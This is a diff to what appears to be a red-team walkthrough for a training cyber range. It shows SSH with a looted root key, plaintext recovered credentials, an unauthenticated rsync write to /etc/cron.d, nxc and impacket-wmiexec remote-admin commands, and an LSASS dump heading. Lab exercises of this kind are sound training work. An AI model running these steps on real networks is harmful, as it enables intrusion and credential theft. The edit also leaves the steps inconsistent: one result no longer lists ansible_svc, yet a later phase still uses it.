@@ -298,7 +298,7 @@ ssh -i /opt/redteam/loot/keys/attacker_key root@LNXBUILDER.cyberange.local \
 # Vault reveals: proxy-admin:Pr0xy@dm1n2025 and ansible_svc:Ans1bl3#Mgmt2025!
 ```
 
-> **Step 2 Result:** Root on LNXBUILDER. Ansible vault decrypted — `proxy-admin:Pr0xy@dm1n2025` and `ansible_svc:Ans1bl3#Mgmt2025!` recovered.
+> **Step 2 Result:** Root on LNXBUILDER. Ansible vault decrypted — `proxy-admin:Pr0xy@dm1n2025` recovered.
 
 ---
 
@@ -316,7 +316,14 @@ After achieving root, the attacker extracts the Kerberos keytab (`/etc/krb5.keyt
 
 The rsync daemon's configuration for the `server-configs` module sets `read only = false` and specifies no authentication — meaning any host with network access to port 873 can write files anywhere under the module's path. Since the module maps to `/etc`, writing to `cron.d/` is equivalent to creating a new privileged cron job on the system. The cron daemon picks up any new files in that directory automatically.
 
-### Phase 3a — Enumerate the Rsync Service
+### Phase 3a — SSH into LNXPROC as proxy-admin
+
+First, SSH into LNXPROC using the `proxy-admin` credentials obtained from Step 2 (decrypted Ansible vault).
+
+```bash
+# SSH to LNXPROC as proxy-admin
+ssh 'proxy-admin@LNXPROC.cyberange.local'
+```
 
 Probe the rsync daemon to list available modules and confirm the `server-configs` module is accessible without credentials.
 
@@ -427,7 +434,7 @@ Three misconfigurations on MGMT make this attack possible:
 
 ### Phase 4a — Verify Access to MGMT
 
-Confirm that `ansible_svc` has local administrator rights on MGMT and that the `svc_itops` session is actively running via the scheduled task.
+Confirm that `ansible_svc` has local administrator rights on MGMT.
 
 ```bash
 # Confirm ansible_svc has local admin rights — look for (Pwn3d!) in the output
@@ -435,11 +442,6 @@ nxc smb MGMT.cyberange.local \
     -u ansible_svc -p 'Ans1bl3#Mgmt2025!' \
     -d cyberange.local
 # Expected: MGMT [+] cyberange.local\ansible_svc:Ans1bl3#Mgmt2025! (Pwn3d!)
-
-# Confirm svc_itops has an active session via the ITOpsMonitor scheduled task
-impacket-wmiexec cyberange.local/ansible_svc:'Ans1bl3#Mgmt2025!'@MGMT.cyberange.local \
-    'tasklist /v | findstr ITOpsMonitor'
-# ITOpsMonitor Running CYBERANGE\svc_itops
 ```
 
 ### Phase 4b — Dump LSASS (Primary Method — lsassy)
